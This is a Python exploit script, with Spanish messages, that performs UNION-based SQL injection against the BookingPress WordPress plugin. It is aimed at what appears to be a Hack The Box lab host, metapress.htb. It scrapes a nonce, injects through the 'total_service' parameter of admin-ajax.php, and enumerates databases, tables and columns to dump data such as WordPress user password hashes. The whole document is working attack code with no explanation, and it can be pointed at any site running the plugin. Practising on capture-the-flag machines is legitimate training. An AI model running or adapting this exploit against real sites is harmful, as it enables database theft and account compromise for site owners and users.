#!/usr/bin/python3

import requests
import argparse
import signal
import json
import sys
import re

def forced_exit(sig, frame):
    print("\nSaliendo...")
    exit(0)

signal.signal(signal.SIGINT, forced_exit)

def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('--var', dest="sql_var", help="Extracción SQL: Variables de entorno.")
    parser.add_argument('-q', '--query', dest="query", nargs="*", help="Extracción SQL: Descubrir DBs, tablas, columnas y datos.")
    return parser.parse_args()

class BookingPressSQLiUnionBased:

    def __init__(self):
        self.url = "http://metapress.htb"
        self.proxies = {"http":"http://127.0.0.1:8080"}

    def execute_request(self, message, nonce, tmp_payload):
        print("Dumpeando info mediante un SQLi...\n")
        old_result = ""

        for row in range(0,100): # En caso de existir 100 filas

            payload = tmp_payload.replace('RRROOOWWW', str(row))

            data_post = {
                "action" : "bookingpress_front_get_category_services",
                "_wpnonce" : nonce,
                "category_id" : "33",
                "total_service" : f"1) UNION ALL SELECT (SELECT {payload}),1,2,3,4,5,6,7,8-- -"
            }
            r = requests.post(self.url + '/wp-admin/admin-ajax.php', data=data_post)

            json_sqli = json.loads(r.content)
            result = json_sqli[0]['bookingpress_service_id']

            if result is None or result == old_result:
                break
            else:
                print(message, end=": ")
                print(result)

            old_result = result

    def extract_wpnonce(self):
        try:
            r = requests.get(self.url + '/events', timeout=6)
            wp_nonce_token = re.findall(r"action:'bookingpress_generate_spam_captcha', _wpnonce:'(.*?)'", r.text)[0]
            return wp_nonce_token
        except requests.exceptions.RequestException as e:
            print("(-) Agrega '10.10.11.186  metapress.htb' a tu objeto /etc/hosts")
            exit(1)

    def extract_db_variables(self, env_var, nonce):
        self.execute_request(env_var, nonce, env_var)

    def extract_db_databases(self, nonce):
        payload = "schema_name FROM information_schema.schemata LIMIT RRROOOWWW,1"

        self.execute_request("Base de datos", nonce, payload)

    def extract_db_tables(self, database, nonce):
        hex_database = database[0].encode('utf-8').hex()
        payload = "table_name FROM information_schema.tables WHERE table_schema IN (0x%s) LIMIT RRROOOWWW,1" % (hex_database)

        self.execute_request("Tabla", nonce, payload)

    def extract_db_columns(self, db_table, nonce):
        hex_database = db_table[0].encode('utf-8').hex()
        hex_table = db_table[1].encode('utf-8').hex()
        payload = f"column_name FROM information_schema.columns WHERE table_schema IN (0x%s) AND table_name IN (0x%s) LIMIT RRROOOWWW,1" % (hex_database, hex_table)

        self.execute_request("Columna", nonce, payload)

    def extract_db_info(self, db_table_column, nonce):
        payload = f"%s FROM %s.%s LIMIT RRROOOWWW,1" % (db_table_column[2], db_table_column[0], db_table_column[1])

        self.execute_request(db_table_column[2], nonce, payload)

    def print_help(self):
        print(f"uso: {sys.argv[0]} -q [DATABASE] [TABLE] [COLUMN] [FIELD]")
        print("\nejemplo:\n  Bases de datos:  %s -q" % (sys.argv[0]))
        print(f"  Tablas:          {sys.argv[0]} -q blog")
        print(f"  Columnas:        {sys.argv[0]} -q blog wp_users")
        print(f"  Campo de tabla:  {sys.argv[0]} -q blog wp_users user_pass")
        exit(1)

    def main(self):
        args = arguments()
        nonce = self.extract_wpnonce()

        try:
            if args.sql_var:
                self.extract_db_variables(args.sql_var, nonce)
            elif len(args.query) == 0:
                self.extract_db_databases(nonce)
            elif len(args.query) == 1:
                self.extract_db_tables(args.query, nonce)
            elif len(args.query) == 2:
                self.extract_db_columns(args.query, nonce)
            elif len(args.query) == 3:
                self.extract_db_info(args.query, nonce)
            else:
                self.print_help()
        except TypeError as err:
            self.print_help()

if __name__ == '__main__':
    BookingPressSQLiUnionBased().main()